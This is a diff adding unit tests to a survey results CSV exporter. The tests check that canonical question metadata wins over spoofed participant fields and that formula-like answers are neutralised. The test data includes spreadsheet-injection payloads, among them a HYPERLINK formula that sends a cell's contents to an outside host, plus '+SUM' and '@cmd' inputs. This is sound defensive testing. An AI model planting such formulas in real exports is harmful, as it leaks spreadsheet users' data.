@@ -359,6 +359,57 @@ describe('surveyResultsExportPlans', () => {
     expect(cells[columns.indexOf('conviction')]).toBe('"2"');
   });
 
+  it('prefers question metadata over the prompt and type a participant payload claims', () => {
+    const csv = buildSurveyResultsResponsesCsvExport({
+      aggregatorQuestionResponses: {
+        q1: [
+          {
+            responder: '0x1111111111111111111111111111111111111111',
+            response: { questionID: 'q1', prompt: 'Spoofed headline', type: 'freeform', answer: { value: 'Agree' } },
+          },
+        ],
+      },
+      networkQuestions: { q1: { prompt: 'Canonical prompt', type: 'binary' } },
+    });
+    expect(csv.split('\n')[1]).toMatch(/^"q1","Canonical prompt","binary",/);
+  });
+
+  it('keeps formula-like participant text from running in spreadsheets', () => {
+    const csv = buildSurveyResultsResponsesCsvExport({
+      aggregatorQuestionResponses: {
+        q1: [
+          {
+            responder: '0x1111111111111111111111111111111111111111',
+            response: {
+              questionID: 'q1',
+              answer: { value: '=HYPERLINK("https://example.test/?d="&A2,"Open")', encrypted: false },
+              additional: { value: '+SUM(1,1)', encrypted: false },
+            },
+          },
+          {
+            responder: '0x2222222222222222222222222222222222222222',
+            response: {
+              questionID: 'q1',
+              answer: { value: '-3', encrypted: false },
+              additional: { value: '@cmd\t-1', encrypted: false },
+            },
+          },
+        ],
+      },
+      networkQuestions: { q1: { prompt: 'Prompt', type: 'freeform' } },
+    });
+    const [header, first, second] = csv.split('\n');
+    const columns = header.split(',');
+    const cell = (line: string, name: string) => line.split('","')[columns.indexOf(name)].replace(/^"|"$/g, '');
+    expect(cell(first, 'answer')).toBe(`'=HYPERLINK(""https://example.test/?d=""&A2,""Open"")`);
+    expect(cell(first, 'additionalComments')).toBe("'+SUM(1,1)");
+    expect(cell(second, 'answer')).toBe('-3');
+    expect(cell(second, 'additionalComments')).toBe("'@cmd\t-1");
+
+    const questionsCsv = buildSurveyResultsQuestionsCsvExport([{ id: 'q1', prompt: '\t=1+1', type: 'freeform' }]);
+    expect(questionsCsv.split('\n')[1]).toBe(`"q1","'\t=1+1","freeform","","",""`);
+  });
+
   it('builds questions JSON from an explicit export snapshot', () => {
     expect(
       buildSurveyResultsQuestionsJsonExport({
